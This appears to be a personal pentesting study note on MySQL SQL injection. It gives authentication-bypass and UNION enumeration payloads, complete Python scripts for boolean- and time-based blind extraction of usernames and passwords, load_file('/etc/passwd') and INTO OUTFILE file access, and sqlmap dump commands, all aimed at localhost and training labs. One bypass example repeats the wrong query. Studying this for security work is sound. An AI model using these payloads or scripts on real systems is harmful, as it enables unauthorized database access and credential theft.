- **tags:** #sqli #top10 #sql
- -------------
For #MySQL DB's:
# Subverting query logic
Let's say we stumble across an authentication form that uses a back-end DBMS to check whether given users and credentials exist or are correct. The site may be using [[Connection With DBMS|php]] to send the following query
```php
$username=$_POST['username'];
$password=$_POST['pass'];
$conn = new mysqli('localhost', 'root', 'password', 'user_db'); 
$query = "select * from users where username = '$username' and password = '$password'";
```
And one could only proceed to the next panel if the previous statement returned *true* boolean value, in other words one would successfully authenticate only if username and password are correct. Nonetheless, if user input is carefully sanitized one could try to break the statement and bypass any type of authentication.
- Using quotes and logical operators:
```MySQL
# User input:
# username = admin' or '1'='1
#password = whatever
select * from users where username = 'admin' or '1'='1' and password = 'whatever'; # Will return true if admin is a valid username
```
- Using quotes and comments:
```MySQL
# User input:
# username = admin'-- -
#password = whatever
select * from users where username = 'admin' or '1'='1' and password = 'whatever'; # Will return true if admin is a valid username
```
**NOTE:** There may be sometimes where we will have to append a `)` to our quotes or double-quotes to escape the query, remember that we are constantly trying to have an idea of how the *query* might be. Sometimes we shouldn't even try to append the `'` or `"`.
# Types
SQL Injections are categorized based on how and where we retrieve their output.
- **In-band:**
In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
*Union-Based*: We may have to specify the exact location (i.e. column), which we can read, so the query will direct the output to be printed there.
*Error-Based*: Used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.
- **Blind:**
In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character.
*Boolean-Based*: We can use SQL conditional statements to control whether the page returns any output at all (i.e. original query response), if our conditional statement returns `true`.
*Time-Based*:  we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.
- **Out-of-band**
In some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, (i.e. DNS record,) and then attempt to retrieve it from there.
# In-Band
## Union-Based
**NOTE:** The way of tackling *in-band* injections is the same regardless of the sub-type. If it's error based, the process will be much easier because we will be receiving constant feedback from the website.
### Even Columns
We can inject a [[MySQL#Union Clause|UNION]] query into the input, such that rows from another table are returned:
```MySQL
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
The above query would return username and password entries from the passwords table, assuming the products table has two columns.
### Uneven Columns
Since both tables need to match on column numbers, we can display junk values on the spare ones. When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error (use *numbers* or *NULL*).
```MySQL
SELECT * from products where product_id = '1' UNION SELECT username, password, 3, 4, 5 from passwords-- '
```
The last injection would successfully work assuming that *product_id* table has a total of 5 columns.
### Determining the amount of columns
We can either use the *union* or *order by* clause to determine how many columns has got the table we are dealing with.
- **Order By**:
With this clause we can specify the column number by which we'd like to sort by. Therefore if we pass along a number bigger than the amount of columns in the column, it will report an error. Therefore by a quick method of trial and error we can find out the actual size.
![[determining_columns.png]]
- **Union:**
Similarly when using the union clause, only when passing the size of the table as the number of arguments we won't get an error.
![[columns_sql_union.png]]
### Determining DBMS
First of all we should indeed verify that we are dealing with a [[MySQL]] DB. Run any of the following commands to double check:
- select `@@version`
Expected Output: MySQL Version
- select `pow(1,1)` 
Expected Output: 1
- select `sleep(5)`
	Expected Output: Blind Injection, server's response should be delayed 5 seconds.
### Database Enumeration
The *INORMATION_SCHEMA.SCHEMATA* table contains all the schema/database names on its *SCHEMA_NAME* column.
```MySQL
'union select 1,SCHEMA_NAME,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
![[db_enum.png]]
To find out which data you are currently in, inject `database()`.
**NOTE:** If there is only one column being displayed, play with `group_concat()` to concatenate the results in only one record.
![[group_concat.png]]

### Table Enumeration
The *INORMATION_SCHEMA.TABLES* table contains all the table names on its *TABLE_NAME* column.
```MySQL
'union select 1,TABLE_NAME,3,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES-- -
```
![[table_enum.png]]
### Column Enumeration
The *INORMATION_SCHEMA.COLUMNS* table contains all the column names on its *COLUMN_NAME* column.
```MySQL
'union select COLUMN_NAME,TABLE_NAME,3,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS-- -
```
![[column_enum.png]]
![[group_concat_and_hex.png]]
### Username Enumeration
To find out what user you are currently logged in as, inject any of the following: `user()`, `current_user()`, `user from mysql.user`.
```MySQL
'union select 1,user(),current_user(),4-- -
'union select 1,user,3,4 from mysql.user
```

# Blind
## Boolean-Based
There may be the time where won't have any on screen feedback of the submitted queries. However looking closely depending on the query submitted we may spot differences on the site's *status code*, *content-length*, etc. If that's the case, we need to try to retrieve our data via boolean queries. Let's go through this kind of injection by analyzing an example.

```PHP
<?php
	$server = "localhost";
	$username = "s4vitar";
	$password = "s4vitar123";
	$database = "Hack4u";
	
	//Conexion a la base de datos
	$conn = new mysqli($server, $username, $password, $database);
	//sanitization
	$id = mysqli_real_escape_string($conn, $_GET['id']);
	//echo $id;

	$query = "select username from users where id = $id";

	$result = mysqli_query($conn, $query);
	$response = mysqli_fetch_array($result);

	if (! isset($response['username'])){
		http_response_code(404);
	}
?>
```
The [[Connection With DBMS|PHP]] code from above is establishing a connection with a [[MySQL]] DB's and sending the following query:
```MySQL
select username from users where id = $id #Where $id would correspond to the user input
```
We also see that user input is being sanitized, so we'll avoid the usage of quotes or double quotes. Lastly we see that if the user enters a non-existent ID, the page will return a *404* status code and there lays the logic that we are going to exploit.
![[logic_exploit.png]]
Both responses return an *empty Content-Length* which proves that we wouldn't be actually seeing any feedback on the page itself. On the last screenshot we observe that the id number 1 exists so the site returns a 200 OK, we would also get this status code for any `SQL query` returning a `True` *0* boolean value. Therefore one could craft the following injection.
![[modification.png]]
So the actual query being processed in the Data Base would be:
```MySQL
select username from users where id=1 and (select ascii(substring(username,1,1)) from users where id = 1)=96
```
Let's clear out what some of the functions displayed do:
- `ascii()`: Gets the decimal representation of an *ascii* character
- `substring()`: Splits the original element to the desired length and position
- Finally note how the parenthesis `()` are being used to design *sub-queries*. Sub-queries are prioritized over the main query.
So know that we have all needed knowledge in mind, we can now see how the last query returns *True* only if **1** is a **valid** `id` **AND** the **first letter of the username** (with id 1) from the users table is an 'a' (or **97** on the decimal scale).
### Exploit
We are going to extract all the usernames and passwords from the database by analyzing the status code from multiple queries made with the [[requests]] library.
```Python
#!/usr/bin/env python3

import requests
from pwn import *
import signal
import sys

main_url = "http://localhost/searchUsers.php"
credentials = []

def def_handler(sig, frame):
    print("\n\nQuitting...\n")
    sys.exit(1)

# Ctrl_C
signal.signal(signal.SIGINT, def_handler)

def makeSQLI():
    
    p1 = log.progress("Brute Force")
    p1.status("Initianting brute force attack")

    time.sleep(2)

    p2 = log.progress("Extracted Data")

    extracted_data = ""

    empty = False
    position=0

    while empty == False:
        counter = 33
        position+=1
        for character in range(33, 127): #all characters represented in decimal
            counter+=1
            url = main_url + f"?id=4 or (select ascii(substring(group_concat(id,0x3a,username,0x3a,password),{position},1)) from users)={character}"
            p1.status(url)
            r = requests.get(url)
            if r.status_code == 200:
                extracted_data += chr(character)
                p2.status(extracted_data)
                break
            elif counter == 127:
                empty = True
    sys.exit(0)


if __name__ == '__main__':

    makeSQLI()
```
![[correction.png]]
## Time-Based
Now let's imagine the case that the website headers, status code etc. don't change for any queries that we submit. We should lastly attempt to check if it's vulnerable to time-based injections. Let's go over this kind of injection by analyzing an example.
```PHP
<?php
	$server = "localhost";
	$username = "s4vitar";
	$password = "s4vitar123";
	$database = "Hack4u";
	
	//Conexion a la base de datos
	$conn = new mysqli($server, $username, $password, $database);
	//sanitization
	$id = mysqli_real_escape_string($conn, $_GET['id']);
	//echo $id;

	$query = "select username from users where id = $id";

	$result = mysqli_query($conn, $query);
	$response = mysqli_fetch_array($result);
?>

```
The [[Connection With DBMS|PHP]] code from above is establishing a connection with a [[MySQL]] DB's and sending the following query:
```MySQL
select username from users where id = $id #Where $id would correspond to the user input
```
We also see that user input is being sanitized, so we'll avoid the usage of quotes or double quotes.
![[time-based.png]]
On the screenshot above we observe how a response from the site is delayed if the **id** provided is **valid**, since only on those cases the **sleep()** function will be executed.
It's now time to craft our malicious injection:
![[time-requests.png]]
On this kind of injection we are playing around with the [[MySQL#If Function|if()]] function, where the page will **delay** its response only when the **condition** supplied is **True**. Thus we could now create our exploit to retrieve all usernames and passwords from the users table.
### Exploit
```Python
#!/usr/bin/env/python3

import time
import requests
from pwn import *
import signal
import sys

main_url = "http://localhost/searchUsers.php" # Don't forget to set the right IP
credentials = []

def def_handler(sig, frame):
    print("\n\nQuitting...\n")
    sys.exit(1)

# Ctrl_C
signal.signal(signal.SIGINT, def_handler)

def makeSQLI():
    
    p1 = log.progress("Brute Force")
    p1.status("Initianting brute force attack")

    time.sleep(2)

    p2 = log.progress("Extracted Data")

    extracted_data = ""

    empty = False
    position=0

    while empty == False:
        counter = 33
        position+=1
        for character in range(33, 127): #all characters represented in decimal
            counter+=1
            url = main_url + f"?id=3 and if((select ascii(substring(group_concat(id,0x3a,username,0x3a,password),{position},1)) from users)={character}, sleep(0.5),1)"
            p1.status(url)
            starting_time=time.time()
            r = requests.get(url)
            finish_time=time.time()
            if finish_time-starting_time > 0.5:
                extracted_data += chr(character)
                p2.status(extracted_data)
                break
            elif counter == 127:
                empty = True
    sys.exit(0)


if __name__ == '__main__':

    makeSQLI()
```
![[results_time.png]]
# Reading and Writing Files
## Checking User Privileges
First we need to find out what's the username we've got.
```MySQL
SELECT USER();
SELECT CURRENT_USER();
SELECT user from mysql.user;
```
Then we need to check its privileges.
```MySQL
select super_priv from mysql.user where user="<our username>";
```
If the last query returns a `Y` that should mean that we've got *DBA* privileges. Another way to see it would be:
```MySQL
select grantee, privilege_type from information_schema.user_privileges;
```
If the last query reports that our user has got the **FILE** privilege we are all set to do so.
## Loading a File
The `load_file()` function can be used to read data from files, the function takes in only one argument.
```MySQL
select load_file('/etc/passwd');
```
## Writing a File
Requirements:
- User with **FILE** privileges
- MySQL global **secure_file_priv** variable not enabled
- Write access to the location we want to write to on the back-end server
### secure_file_priv variable
An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. *MariaDB* has this variable set to *empty by default*, which lets us read/write to any file if the user has the `FILE` privilege. However, *MySQL* uses `/var/lib/mysql-files` as the *default* folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.
To obtain the value of such variable run:
```MySQL
show variables like 'secure_file_priv';
```
However on an injection since we would most likely using select, run:
```MySQL
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";
```
Once we have discovered our writing permissions use the following to write into files:
```MySQL
select * from users into outfile '/tmp/credentials.txt'
select "this is a test" into outfile '/tmp/test.txt'
```
Note how we can either save the output of queries or just make up the content we want to write. For long file exports use the `FROM_BASE64('base64_data')` funtion.

# Automated Tools
## sqlmap
Intercept request with [[Burp Suite]] and save it to a file (in our cas *request.req*).
![[2.png]]
```bash
sqlmap -r request.req -p searchitem --batch --dbs
```
With the last command *sqlmap* will dump the existing databases if the system is injectable.
![[3.png]]
From here, we can keep on listing tables, columns and values.
```bash
sqlmap -r request.req -p searchitem --batch -D sqlitraining --tables
sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users --columns
sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C username,password --dump #dump values of selected columns
```
By default, it will try to crack the hashed values.
![[4.png]]

### Resource Labs
- [sqlinjection-training-app](https://github.com/appsecco/sqlinjection-training-app)
- [[Connection With DBMS#Another way of Connecting to the DB|Set up your own server for practice]]
- [GoodGames HTB](https://app.hackthebox.com/machines/446)